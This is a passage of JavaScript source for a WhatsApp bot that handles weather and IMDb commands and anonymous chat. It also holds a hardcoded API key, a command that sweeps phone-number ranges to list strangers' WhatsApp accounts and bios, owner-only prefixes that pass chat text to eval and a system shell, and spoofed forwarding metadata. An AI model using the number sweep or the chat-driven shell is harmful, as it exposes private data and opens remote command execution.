            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "🙂imdbVotes  : " + fids.data.imdbVotes + ""
           Dare.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
            break
case 'cuaca':
case 'weather':{
if (!text) return replydare('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️ Weather of  ${text}*\n\n`
            textw += `*☀️ Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*📖 Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*🌡️ Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*🙂 Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*⚖️ Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*🌬️ Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*💧 Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*🌐 Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*📏 Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*🇳🇬 Country:-* ${wdata.data.sys.country}\n`

           Dare.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break

           case 'wanumber': case 'searchno': case 'searchnumber':{
           	if (!text) return replydare(`Provide Number with last number x\n\nExample: ${prefix + command} 234xxxx`)
var inputnumber = text.split(" ")[0]
        
        replydare(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
random21 = `${status1}`
            } else if (random_length == 2) {
random21 = `${status1}${status2}`
            } else if (random_length == 3) {
random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await Dare.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
try {
var anu1 = await Dare.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Africa/Lagos').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
            } catch {
nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replydare(`${text66}${nobio}${nowhatsapp}`)
        }
break

default:

if (budy.startsWith('<')) {
if (!DareTheCreator) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('$')) {
                    if (!DareTheCreator) return reply(mess.only.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replydare(err)
                        if (stdout) return replydare(stdout)
                    })
                }


if (budy.startsWith('vv')) {
if (!DareTheCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!DareTheCreator) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Dare.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

if (m && !m.fromMe) { 
    // Check if the message exists and is not sent by the bot itself
    let user = global.db.users[m.sender];
    const cooldown = 3600000;

    // Initialize the user's cooldown property if it doesn't exist
    if (!user?.pc) user.pc = 0;

    // Ensure cooldown has passed before responding
    if (new Date() - user.pc < cooldown) return;

    // Construct the reply message for any incoming message
    let caption = `Yo @${m.sender.split('@')[0]}, the owner will be with you shortly.`.trim();

    // Send the response
    Dare.sendMessage(m.chat, { 
        text: caption, 
        contextInfo: { 
            forwardingScore: 10, 
            isForwarded: true, 
            mentionedJid: [m.sender],
            businessMessageForwardInfo: { 
                businessOwnerJid: botNumber 
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: 'https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M',
                serverMessageId: null,
                newsletterName: "𝐃𝐀𝐑𝐄-𝐕𝟑"
            }
        }
    }, { 
        quoted: { 
            key: { 
                participant: '2348089405509@s.whatsapp.net', 
                remoteJid: "2348089405509@s.whatsapp.net" 
            }, 
            message: { 
                conversation: "𝐃𝐀𝐑𝐄-𝐕𝟑 found and made by BMB X DARE"
            }
        }
    });

    // Update the user's cooldown timestamp
    user.pc = new Date() * 1;
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Dare.sendMessage(`${owner}@s.whatsapp.net`, { text: "Hello developers, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
